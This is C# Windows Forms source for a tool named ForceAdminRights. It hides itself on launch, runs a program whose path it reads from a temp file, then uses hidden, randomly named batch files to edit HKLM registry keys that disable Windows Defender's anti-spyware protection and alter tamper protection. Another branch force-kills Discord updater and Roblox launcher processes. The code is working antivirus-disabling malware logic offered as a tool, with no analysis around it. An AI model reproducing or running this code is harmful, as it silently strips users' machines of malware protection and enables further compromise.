using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ForceAdminRights
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private string User = System.Environment.GetEnvironmentVariable("USERPROFILE");

        public void RunCommand(string Command)
        {
            string[] CommandChut = { Command };
            File.WriteAllLines("C:\\RunCommand.bat", CommandChut);
            var C = Process.Start("C:\\RunCommand.bat");
            C.WaitForExit();
            File.Delete("C:\\RunCommand.bat");
        }
        private async void Form1_Load(object sender, EventArgs e)
        {
            File.WriteAllText(User + "\\AppData\\Local\\Temp\\ForceOpened.txt", "true");
            ShowInTaskbar = false;
            Visible = false;
            string FileToRun = File.ReadLines(User + "\\AppData\\Local\\Temp\\FileToRun.txt").First();
            if (FileToRun == "messageforcer")
            {
                RunCommand("taskkill /f /im DiscordUpdater.exe");
                RunCommand("taskkill /f /im DiscordSoftwareUpdater.exe");
                await Task.Delay(1000);
                RunCommand("taskkill /f /im RobloxPlayerLauncher.exe");
                await Task.Delay(2000);
                Process.Start(User + "\\Documents\\ROBLOX\\RobloxPlayerLauncher.exe");
            }
            else
            {
                Process.Start(FileToRun);
                await DisableAntiVirus();
            }
            Application.Exit();
        }

        private async Task DisableAntiVirus()
        {
            await RunCommandHidden(
                "REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /V DisableAntiSpyware /F");
            await RunCommandHidden(
                "REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /V DisableAntiSpyware /T REG_DWORD /D 1 /F");
            await RunCommandHidden(
                "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /V TamperProtection /F");
            await RunCommandHidden(
                "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /V TamperProtection /T REG_DWORD /D 4 /F ");

        }
        public static byte[] GetHash(string inputString)
        {
            using (HashAlgorithm algorithm = SHA256.Create())
                return algorithm.ComputeHash(Encoding.UTF8.GetBytes(inputString));
        }

        public static string GetHashString(string inputString)
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte b in GetHash(inputString))
                sb.Append(b.ToString("X2"));

            return sb.ToString();
        }

        private bool Exit = false;
        public async Task RunCommandHidden(string Command)
        {
            Random dew = new Random();
            int hui = dew.Next(0000, 9999);
            string[] CommandChut = { Command };
            File.WriteAllLines(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat", CommandChut);
            Process C = new Process();
            C.StartInfo.FileName = System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat";
            C.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            C.EnableRaisingEvents = true;
            C.Exited += C_Exited;
            C.Start();
            while (Exit == false)
            {
                await Task.Delay(10);
            }

            Exit = false;
            File.Delete(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat");
        }

        private void C_Exited(object sender, EventArgs e)
        {
            Exit = true;
        }
    }
}
